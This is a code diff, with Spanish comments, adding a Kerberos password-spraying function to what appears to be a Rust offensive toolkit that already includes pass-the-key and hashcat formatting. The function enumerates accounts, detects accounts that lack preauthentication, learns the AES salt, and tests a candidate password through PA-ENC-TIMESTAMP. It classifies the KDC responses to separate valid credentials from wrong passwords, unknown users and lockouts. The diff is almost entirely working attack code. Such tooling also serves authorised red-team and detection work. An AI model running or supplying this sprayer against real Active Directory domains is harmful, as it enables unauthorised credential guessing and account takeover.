@@ -146,6 +146,108 @@ pub fn pass_the_key(conn: &KdcConnection, user: &str, realm: &str, key: Kerberos
     Ok(charon_client::request_tgt(conn, user, realm, &key, etypes, 0)?)
 }
 
+// ---------- password spraying ----------
+
+/// Resultado de un intento de password spraying contra una cuenta.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub enum SprayResult {
+    /// Contraseña correcta: el KDC emitió un TGT y el enc-part se descifró.
+    Valid,
+    /// El usuario existe pero la contraseña es incorrecta (KDC_ERR_PREAUTH_FAILED, 24).
+    WrongPassword,
+    /// El principal no existe (KDC_ERR_PRINCIPAL_UNKNOWN, 6).
+    UnknownUser,
+    /// Cuenta DONT_REQUIRE_PREAUTH: el TGT no depende de la contraseña.
+    NoPreauth,
+    /// Cualquier otra respuesta del KDC (lockout, clock skew, límite…).
+    KdcError { code: i32, detail: String },
+}
+
+impl SprayResult {
+    pub fn valid(&self) -> bool {
+        matches!(self, SprayResult::Valid)
+    }
+}
+
+/// Un intento de spray sobre un usuario concreto.
+#[derive(Clone, Debug)]
+pub struct SprayAttempt {
+    pub user: String,
+    pub result: SprayResult,
+}
+
+/// Prueba una contraseña contra UN usuario.
+///
+/// Dos pasos de protocolo por usuario: (1) AS-REQ sin preauth para
+/// clasificar la cuenta (6/25/sin preauth) y aprender el salt del
+/// PA-ETYPE-INFO2 — así el spray AES usa el salt correcto y no genera
+/// fallos de derivación falsos; (2) AS-REQ con PA-ENC-TIMESTAMP cifrado
+/// con la clave derivada de la contraseña candidata. Un AS-REP que se
+/// descifra = credenciales válidas; un 24 = contraseña incorrecta.
+pub fn spray_password(
+    conn: &KdcConnection,
+    user: &str,
+    realm: &str,
+    password: &str,
+    etypes: &[i32],
+) -> std::result::Result<SprayAttempt, String> {
+    let attempt = |r: SprayResult| Ok(SprayAttempt { user: user.to_string(), result: r });
+
+    // (1) clasificación + salt del error 25 (uso AES256 en la sonda: es el
+    // etype con el que se hará el spray, evitando preauth RC4 en el cable).
+    let probe = charon_client::probe_as_no_preauth(
+        conn,
+        user,
+        realm,
+        &[etype::AES256_CTS_HMAC_SHA1_96],
+    )
+    .map_err(|e| e.to_string())?;
+
+    let salt = match &probe {
+        AsProbe::PrincipalUnknown { .. } => return attempt(SprayResult::UnknownUser),
+        AsProbe::NoPreauth { .. } => return attempt(SprayResult::NoPreauth),
+        AsProbe::PreauthRequired { salts, .. } => salts
+            .iter()
+            .find(|s| s.etype == etype::AES256_CTS_HMAC_SHA1_96)
+            .and_then(|s| s.salt.clone())
+            .map(|b| String::from_utf8_lossy(&b).into_owned())
+            .unwrap_or_else(|| format!("{realm}{user}")),
+        AsProbe::PreauthFailed { .. } => format!("{realm}{user}"),
+        AsProbe::Error { code, e_text, .. } => {
+            return attempt(SprayResult::KdcError { code: *code, detail: e_text.clone().unwrap_or_default() })
+        }
+    };
+
+    // (2) preauth con la contraseña candidata.
+    let key = KerberosKey::from_password(password, &salt, etype::AES256_CTS_HMAC_SHA1_96)
+        .map_err(|e| e.to_string())?;
+    let req = charon_client::build_as_req(
+        user,
+        realm,
+        Some(&key),
+        etypes,
+        true,
+        charon_krb5::kdc_options::FORWARDABLE,
+    )
+    .map_err(|e| e.to_string())?;
+    let wire = req.build().map_err(|e| e.to_string())?;
+    let (reply, _transport) = conn.exchange(&wire).map_err(|e| e.to_string())?;
+
+    if let Ok(err) = charon_krb5::KrbError::parse(&reply) {
+        return match err.error_code {
+            charon_krb5::error_codes::KDC_ERR_PREAUTH_FAILED => attempt(SprayResult::WrongPassword),
+            c => attempt(SprayResult::KdcError {
+                code: c,
+                detail: err.e_text.unwrap_or_default(),
+            }),
+        };
+    }
+    // Un AS-REP solo cuenta como válido si el enc-part se descifra con la
+    // clave derivada de la contraseña (descartar AS-REP falsificados).
+    charon_client::parse_as_reply(&reply, user, &key).map_err(|e| e.to_string())?;
+    attempt(SprayResult::Valid)
+}
+
 // ---------- formatos hashcat ----------
 
 pub mod formats {
